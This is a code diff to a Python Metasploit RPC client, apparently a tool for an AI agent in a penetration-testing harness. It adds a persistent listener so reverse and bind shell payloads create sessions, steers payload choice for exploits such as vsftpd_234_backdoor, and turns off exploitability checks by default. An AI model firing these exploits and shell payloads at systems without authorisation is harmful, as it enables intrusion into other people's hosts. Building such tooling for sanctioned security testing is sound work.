@@ -347,10 +347,18 @@ class MetasploitClient:
         "of options (RHOSTS, USERNAME, PASSWORD, PAYLOAD, LHOST, LPORT). "
         "The module_path MUST be the exact value returned by index_modules's "
         "module_path field — do not abbreviate, shorten, or paraphrase it. "
-        "Polls for new sessions and reports their IDs.",
+        "Polls for new sessions and reports their IDs. "
+        "start_handler: pass True for EXPLOIT modules that use a reverse or "
+        "bind PAYLOAD (e.g. cmd/unix/reverse, windows/meterpreter/reverse_tcp). "
+        "It starts a separate persistent exploit/multi/handler listener on "
+        "LHOST:LPORT first, because over msfrpcd the exploit's implicit handler "
+        "does NOT bind — without an explicit handler the target's callback "
+        "reaches nothing and no session is ever created. Pass start_handler=False "
+        "(the default) for auxiliaries and login scanners that need no inbound "
+        "listener.",
         transport=TransportType.MCP_RPC,
     )
-    async def execute_module(self, module_path, options):
+    async def execute_module(self, module_path, options, start_handler=False):
         """
         Execute a Metasploit module with specified options.
 
@@ -362,7 +370,19 @@ class MetasploitClient:
 
         Args:
             module_path: Full MSF module path, e.g. 'auxiliary/scanner/ssh/ssh_login'.
-            options: Dict of option name -> value, e.g. {'RHOSTS': '10.0.0.5', 'USERNAME': 'root', 'PASSWORD': 'toor'}.
+            options: Dict of option name -> value, e.g. {'RHOSTS': '10.0.0.5', 'USERNAME': 'root', 'PASSWORD': 'toor', 'PAYLOAD': 'cmd/unix/reverse', 'LHOST': '100.64.0.1', 'LPORT': '4444'}.
+            start_handler: If True, start a SEPARATE persistent
+                'exploit/multi/handler' job (same PAYLOAD/LHOST/LPORT from
+                options) BEFORE firing the module, so there is a live listener
+                for the payload's callback.  This is required for reverse/bind
+                payloads over msfrpcd: the exploit module's *implicit* payload
+                handler does NOT reliably bind a listener via the RPC
+                'module.execute' path, so the target's callback reaches
+                nothing and no session is ever created (the "connect then
+                close" symptom).  A standalone multi/handler DOES bind and
+                persist.  Pass True for exploit modules that use a reverse or
+                bind payload; pass False (the default) for auxiliaries, login
+                scanners, and any module that does not need an inbound listener.
         """
         if not await self._ensure_running():
             return None
@@ -419,6 +439,60 @@ class MetasploitClient:
             opts = dict(options)  # copy so we don't mutate the caller's dict
             payload_name = opts.pop("PAYLOAD", None)
 
+            # Validate the requested PAYLOAD against the module's compatible
+            # payloads BEFORE attempting to launch.  The single most common
+            # vsftpd_234_backdoor failure is "Unsupported Binary Selected": the
+            # caller picks a binary FTP-stager payload (cmd/linux/ftp/<arch>/*)
+            # whose ELF can't be staged through the backdoor's raw shell on
+            # port 6200.  Reject those up front and steer the caller at the
+            # pure-command cmd/unix/* payloads that run a one-liner on the
+            # shell.  Also note that meterpreter payloads are unusable through
+            # this pymetasploit3 client (it serializes AutoLoadExtensions as a
+            # non-scalar and MSF rejects it with "Invalid module option value
+            # for AutoLoadExtensions: must be a scalar").
+            if mtype == "exploit" and payload_name:
+                # Hard-block meterpreter payloads: pymetasploit3 serializes the
+                # meterpreter AutoLoadExtensions option as a non-scalar, and MSF
+                # rejects the whole launch with "Invalid module option value for
+                # AutoLoadExtensions: must be a scalar".  No meterpreter payload
+                # can succeed through this client until that bug is fixed, so
+                # fail fast with a clear instruction instead of letting MSF
+                # reject it (which previously surfaced as job_id='?' + a 30s
+                # no-op poll).
+                if "meterpreter" in payload_name:
+                    return (
+                        f"PAYLOAD '{payload_name}' is a meterpreter payload, which "
+                        f"cannot be used through this pymetasploit3 RPC client: it "
+                        f"serializes the meterpreter AutoLoadExtensions option as a "
+                        f"non-scalar and MSF rejects the launch ('Invalid module "
+                        f"option value for AutoLoadExtensions: must be a scalar'). "
+                        f"Use a non-meterpreter payload instead — a pure-command "
+                        f"cmd/unix/* payload (e.g. cmd/unix/bind_perl, "
+                        f"cmd/unix/reverse_perl) or a cmd/linux/.../shell* payload."
+                    )
+                try:
+                    compatible = list(module.payloads)
+                except Exception:
+                    compatible = []
+                if compatible and payload_name not in compatible:
+                    pure = [p for p in compatible if p.startswith("cmd/unix/")]
+                    binary = [p for p in compatible if "/ftp/" in p or "/tftp/" in p]
+                    meterp = [p for p in compatible if "meterpreter" in p]
+                    return (
+                        f"PAYLOAD '{payload_name}' is not compatible with "
+                        f"'{module_path}' (its compatible payloads do not include "
+                        f"it). Using it would make MSF fail at the command-stager "
+                        f"stage with 'Unsupported Binary Selected'. "
+                        f"Use a PURE-COMMAND payload that runs a one-liner on the "
+                        f"target shell — e.g. {pure[:6]}. Avoid binary stagers "
+                        f"({len(binary)} such as {binary[:3]}) which cannot stage an "
+                        f"ELF through a raw shell, and avoid meterpreter payloads "
+                        f"({len(meterp)} listed) which this client cannot serialize "
+                        f"('AutoLoadExtensions: must be a scalar'). For a target that "
+                        f"cannot route back to your LHOST, pick a cmd/unix/bind_* "
+                        f"payload and set RHOST to the target."
+                    )
+
             # Set non-payload options on the module datastore first.
             # Check against module.options (the list of valid option names),
             # NOT `option in module` — __contains__ checks _runopts which is
@@ -444,6 +518,22 @@ class MetasploitClient:
                 # If the caller explicitly passed it, _coerce already set it
                 # in the loop above.
 
+            # Harness defaults for exploit modules: skip the exploitability
+            # check (AutoCheck=false) and force execution even when the check
+            # is inconclusive (ForceExploit=true).  The operator has already
+            # approved this run via the human-in-the-loop gate, so the check
+            # is pure friction — and for backdoor-style exploits it actively
+            # misfires: once the backdoor port (e.g. 6200) is open from a
+            # prior run, AutoCheck aborts with "Cannot reliably check
+            # exploitability … set ForceExploit true".  Both options are
+            # settable datastore options and the caller can override either
+            # by passing it in `options` (the loop above already applied it).
+            if mtype == "exploit":
+                if "AutoCheck" in module.options and "AutoCheck" not in opts:
+                    module["AutoCheck"] = False
+                if "ForceExploit" in module.options and "ForceExploit" not in opts:
+                    module["ForceExploit"] = True
+
             # Build the payload argument for execute().
             payload_arg = None
             if payload_name:
@@ -459,6 +549,81 @@ class MetasploitClient:
                         payload_mod[opt_name] = coerced
                 payload_arg = payload_mod
 
+            # Optional explicit listener: over msfrpcd an exploit module's
+            # *implicit* payload handler does NOT reliably bind a reverse/bind
+            # listener, so the payload's callback reaches nothing and no
+            # session is created.  A standalone 'exploit/multi/handler' job
+            # DOES bind and persist.  When start_handler=True (and the caller
+            # supplied PAYLOAD + LHOST + LPORT), start one now so there is a
+            # live listener for the callback.  Not every module needs this
+            # (auxiliaries, login scanners), so it is opt-in via the
+            # start_handler parameter rather than automatic.
+            handler_job = None
+            if start_handler:
+                if not payload_name:
+                    return (
+                        "start_handler=True requires a PAYLOAD in options (a "
+                        "reverse/bind payload), but none was provided. Either "
+                        "set PAYLOAD/LHOST/LPORT and retry, or set "
+                        "start_handler=False if this module needs no listener."
+                    )
+                # Resolve LHOST/LPORT from options (case-sensitive key lookup;
+                # MSF option names are uppercase by convention).
+                lhost = opts.get("LHOST")
+                lport = opts.get("LPORT")
+                # Fall back to whatever the PayloadModule already has set.
+                if not lhost and payload_arg is not None and "LHOST" in payload_arg.options:
+                    lhost = payload_arg["LHOST"]
+                if not lport and payload_arg is not None and "LPORT" in payload_arg.options:
+                    lport = payload_arg["LPORT"]
+                if not lhost or not lport:
+                    return (
+                        "start_handler=True requires LHOST and LPORT in options "
+                        f"(got LHOST={lhost!r}, LPORT={lport!r}). LHOST must be an "
+                        "IP the TARGET can route a connection back to. Set "
+                        "PAYLOAD, LHOST, LPORT and retry."
+                    )
+                try:
+                    handler_mod = self.client.modules.use(
+                        "exploit", "multi/handler"
+                    )
+                    handler_pl = self.client.modules.use("payload", payload_name)
+                    handler_pl["LHOST"] = lhost
+                    handler_pl["LPORT"] = lport
+                    handler_result = handler_mod.execute(payload=handler_pl)
+                    handler_job = (
+                        handler_result.get("job_id") if isinstance(handler_result, dict) else handler_result
+                    )
+                    if handler_job is None:
+                        return (
+                            "Failed to start exploit/multi/handler (MSF returned "
+                            f"no job_id for {payload_name} LHOST={lhost} LPORT={lport}). "
+                            "The port may already be bound by another handler, or the "
+                            "payload/LHOST/LPORT are invalid."
+                        )
+                    # Give the listener a moment to bind before the exploit
+                    # fires, so the callback never arrives ahead of the bind.
+                    await asyncio.sleep(1.0)
+                except Exception as e:
+                    # A handler that won't start is not fatal to the exploit
+                    # itself, but for reverse payloads it usually means no
+                    # session will form — surface it rather than silently
+                    # proceeding to the 30s poll with no listener.
+                    return (
+                        f"Failed to start exploit/multi/handler for "
+                        f"{payload_name} on {lhost}:{lport}: {e}. The listener "
+                        "could not bind (port in use?) or the payload is invalid."
+                    )
+
+                # We are providing the listener ourselves, so the exploit
+                # module must NOT start its own implicit handler — otherwise
+                # both try to bind LHOST:LPORT and the exploit fails with
+                # Rex::BindFailed ("address already in use").  DisablePayloadHandler
+                # IS a regular datastore option on exploit modules, so it is
+                # settable via __setitem__ (unlike ExitOnSession).
+                if mtype == "exploit" and "DisablePayloadHandler" in module.options:
+                    module["DisablePayloadHandler"] = True
+
             # Execute the module (fires as a job, returns immediately).
             # For exploit modules with a payload, the handler is enabled and
             # LHOST/LPORT are properly set.  For auxiliaries, payload_arg is
@@ -468,22 +633,93 @@ class MetasploitClient:
             else:
                 result = module.execute()
 
-            # module.execute() returns {'job_id': <int>, 'uuid': <str>} from
-            # the MSF RPC 'module.execute' endpoint.  The job_id lets the
-            # caller track the running job; the uuid lets us poll
-            # 'module.results' to retrieve the module's ACTUAL output
-            # (auxiliary scanner findings, ssh_login success/failure, check
-            # codes, run errors) which MSF records per-run.  The previous
-            # code ignored this entirely — it only ever printed the result
-            # dict as "job_id={result}" and the session list, hiding login/
-            # scan results from the caller even when the module succeeded.
-            if isinstance(result, dict):
-                job_id = result.get("job_id", result.get("jobID", "?"))
+            # module.execute() normally returns {'job_id': <int>, 'uuid': <str>}
+            # from the MSF RPC 'module.execute' endpoint.  Three failure shapes
+            # must be detected here and surfaced as a clear error instead of
+            # being masked by the 30s session-poll below:
+            #
+            #   1. MSF refuses to launch (no/invalid PAYLOAD, missing required
+            #      option, or DisablePayloadHandler on a module that needs its
+            #      own handler):  {'job_id': None, 'uuid': None}.
+            #   2. MSF rejects the option set outright (e.g. pymetasploit3
+            #      serializing a meterpreter payload's AutoLoadExtensions as a
+            #      non-scalar):  {'error': true, 'error_message': '...',
+            #      'error_string': '...', 'error_code': 400}.
+            #   3. Older pymetasploit3 that omits the key entirely, so the
+            #      '.get(..., "?")' placeholder "?" slips through the None
+            #      check below.
+            launch_error_msg = None
+            if isinstance(result, dict) and result.get("error"):
+                launch_error_msg = (
+                    result.get("error_message")
+                    or result.get("error_string")
+                    or str(result)
+                )
+                job_id = None
+                run_uuid = result.get("uuid")
+            elif isinstance(result, dict):
+                job_id = result.get("job_id", result.get("jobID"))
                 run_uuid = result.get("uuid")
             else:
                 # Older MSF/pymetasploit3 may return a bare job id.
                 job_id = result
                 run_uuid = None
+
+            # job_id is "missing" when it is None, or the "?" placeholder
+            # (older client that returned no job_id/jobID key), or an empty
+            # string.  Treat all of these as "MSF refused to launch".
+            job_missing = (
+                job_id is None
+                or (isinstance(job_id, str) and not job_id.strip())
+            )
+
+            if launch_error_msg is not None or job_missing:
+                # We may have started a separate handler expecting this module
+                # to launch handler-less; if the module refused to launch
+                # (e.g. a "manual" exploit like vsftpd_234_backdoor that REQUIRES
+                # its own handler and rejects DisablePayloadHandler), stop the
+                # handler we started so it isn't left orphaned on LHOST:LPORT.
+                if handler_job is not None:
+                    try:
+                        self.client.jobs.stop(str(handler_job))
+                    except Exception:
+                        pass
+                hint = ""
+                if mtype == "exploit":
+                    if not payload_name:
+                        hint = (
+                            " For an exploit module this usually means no PAYLOAD "
+                            "was supplied — MSF needs a payload (and LHOST/LPORT for "
+                            "reverse/bind payloads) to launch. Add PAYLOAD, LHOST, "
+                            "LPORT to options and set start_handler=True."
+                        )
+                    elif start_handler:
+                        hint = (
+                            " A PAYLOAD was supplied and start_handler=True disabled "
+                            "the module's own handler (DisablePayloadHandler), but MSF "
+                            "refused to launch. Some 'manual' exploits (e.g. "
+                            "vsftpd_234_backdoor) REQUIRE their own handler and reject "
+                            "DisablePayloadHandler. Retry with start_handler=False and a "
+                            "LHOST the TARGET can route a connection back to."
+                        )
+                    else:
+                        hint = (
+                            " A PAYLOAD was supplied but MSF still refused to launch "
+                            "— verify the payload is compatible with this module/"
+                            "target and that all required options (RHOSTS, etc.) are "
+                            "set and correctly typed."
+                        )
+                if launch_error_msg is not None:
+                    return (
+                        f"MSF rejected the launch of '{module_path}': "
+                        f"{launch_error_msg}. The module never ran, so no session "
+                        f"can be created.{hint}"
+                    )
+                return (
+                    f"MSF refused to launch module '{module_path}' (job_id=null, "
+                    f"uuid={run_uuid}). The module never ran, so no session can be "
+                    f"created.{hint}"
+                )
 
             # Poll for new sessions.  ssh_login and similar auxiliaries take
             # a few seconds to connect and create a session; without this
